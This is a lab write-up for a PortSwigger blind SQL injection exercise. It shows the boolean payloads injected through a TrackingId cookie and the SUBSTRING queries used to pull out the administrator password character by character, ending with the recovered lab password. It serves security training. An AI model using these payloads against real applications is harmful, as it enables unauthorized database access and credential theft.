# Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability in a tracking
cookie. The SQL query uses the value supplied in the cookie, but its
normal result is not shown and no database error is displayed.

Instead, the application shows a `Welcome back` message when the query
returns at least one row. This difference in the response can therefore
be used as a true/false signal.

The database contains a `users` table with `username` and `password`
columns. The objective is to determine the administrator's password and
then log in.

Hint: The password contains only lowercase letters and numbers.

------------------------------------------------------------------------

References:

-   https://portswigger.net/web-security/sql-injection/blind
-   https://portswigger.net/web-security/sql-injection/cheat-sheet

------------------------------------------------------------------------

The SQL injection point is the tracking cookie.

<img width="576" height="340" alt="1" src="https://github.com/user-attachments/assets/38e2a5a2-fd47-429e-a267-78378c7faf94" />


A true condition causes the application to display `Welcome back!`:

``` text
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='1;
```

<img width="1001" height="372" alt="2" src="https://github.com/user-attachments/assets/2f6a83e7-c270-4161-87fd-cff2cc2854c7" />


When the condition is false, the message is not displayed:

``` text
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='0;
```

<img width="999" height="371" alt="3" src="https://github.com/user-attachments/assets/bcd7bf2f-8704-4468-8b65-9714e104a8a8" />


This true/false behavior can be used to test individual password
characters. For example, the following condition checks whether the
first character of the administrator password is `s`:

``` text
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='s
```

The same condition can be placed inside the cookie:

``` text
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,1)='s
```

The request can then be sent to Intruder to test possible characters.

<img width="485" height="100" alt="4" src="https://github.com/user-attachments/assets/533fbb95-ccad-4e9f-b9dc-0166e4ce8b71" />


The first character is confirmed as `s`, so the next position can be
tested:

``` text
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,2)='ss
```

``` text
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,2)='ss
```

<img width="433" height="145" alt="5" src="https://github.com/user-attachments/assets/a10616fb-715e-4e0b-aae9-c82886a094d9" />


A more efficient approach is to test one character position at a time:

``` text
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),2,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),3,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),4,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),5,1)='a
...
```

Repeating the process until every position is identified gives the
password:

``` text
ssmyivfjyj5m1bvch02g
```
